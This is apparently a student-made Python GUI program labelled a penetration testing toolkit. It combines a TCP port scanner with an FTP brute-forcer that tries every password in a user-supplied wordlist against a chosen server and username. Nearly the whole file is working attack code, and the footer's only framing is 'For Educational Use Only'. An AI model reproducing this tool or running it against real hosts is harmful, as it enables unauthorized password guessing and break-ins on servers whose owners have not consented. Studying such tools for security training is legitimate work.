# PENETRATION-TESTING-TOOLKIT-
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import socket
from ftplib import FTP

# ==== Function to scan ports ====
def scan_ports(ip, port_range):
    open_ports = []
    try:
        start, end = map(int, port_range.split("-"))
        for port in range(start, end + 1):
            try:
                s = socket.socket()
                s.settimeout(0.5)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
                s.close()
            except:
                pass
        if not open_ports:
            return ["No open ports found."]
        return open_ports
    except:
        return ["Invalid port range. Use format like 20-80."]

# ==== Function to perform FTP brute force ====
def ftp_brute_force(ip, username, password_list):
    success = []
    for pwd in password_list:
        pwd = pwd.strip()
        try:
            ftp = FTP(ip)
            ftp.login(user=username, passwd=pwd)
            ftp.quit()
            success.append(pwd)
        except:
            continue
    return success

# ==== Function called when "Scan Ports" button is clicked ====
def run_port_scan():
    ip = entry_ip.get()
    ports = entry_ports.get()
    if not ip or not ports:
        messagebox.showerror("Input Error", "Please enter both IP and port range.")
        return
    result = scan_ports(ip, ports)
    output.delete("1.0", tk.END)
    output.insert(tk.END, f"Open ports on {ip}:\n{result}\n")

# ==== Function called when "Run FTP Brute Force" button is clicked ====
def run_ftp_brute():
    ip = entry_ftp_ip.get()
    username = entry_ftp_user.get()
    if not ip or not username:
        messagebox.showerror("Input Error", "Please enter FTP server IP and username.")
        return
    file_path = filedialog.askopenfilename(title="Select Password File")
    if not file_path:
        return
    with open(file_path, "r") as f:
        passwords = f.readlines()
    result = ftp_brute_force(ip, username, passwords)
    output.delete("1.0", tk.END)
    if result:
        output.insert(tk.END, f"Success! Passwords found for {username}@{ip}:\n{result}\n")
    else:
        output.insert(tk.END, f"No valid passwords found for {username}@{ip}.\n")

# ==== GUI Design ====
root = tk.Tk()
root.title("Penetration Testing Toolkit - Student Version")
root.geometry("700x600")
root.resizable(False, False)

# ===== Title =====
tk.Label(root, text="Penetration Testing Toolkit", font=("Helvetica", 16, "bold"), fg="blue").pack(pady=10)

# ==== PORT SCANNER SECTION ====
tk.Label(root, text="🔍 Port Scanner", font=("Helvetica", 14, "bold")).pack()
tk.Label(root, text="Target IP:").pack()
entry_ip = tk.Entry(root, width=40)
entry_ip.pack()

tk.Label(root, text="Port Range (e.g., 20-80):").pack()
entry_ports = tk.Entry(root, width=40)
entry_ports.pack()

tk.Button(root, text="Scan Ports", bg="#d9edf7", command=run_port_scan).pack(pady=10)

# ==== FTP BRUTE FORCE SECTION ====
tk.Label(root, text="🔓 FTP Brute Forcer", font=("Helvetica", 14, "bold")).pack(pady=10)
tk.Label(root, text="FTP Server IP:").pack()
entry_ftp_ip = tk.Entry(root, width=40)
entry_ftp_ip.pack()

tk.Label(root, text="Username:").pack()
entry_ftp_user = tk.Entry(root, width=40)
entry_ftp_user.pack()

tk.Button(root, text="Run Brute Force (Select Password File)", bg="#dff0d8", command=run_ftp_brute).pack(pady=10)

# ==== OUTPUT BOX ====
tk.Label(root, text="📋 Output", font=("Helvetica", 14, "bold")).pack(pady=5)
output = scrolledtext.ScrolledText(root, width=80, height=15, wrap=tk.WORD, bg="#f7f7f7")
output.pack(pady=5)

# ==== Footer ====
tk.Label(root, text="Made by Students | For Educational Use Only", fg="gray").pack(pady=5)

# ==== Run the GUI ====
root.mainloop()
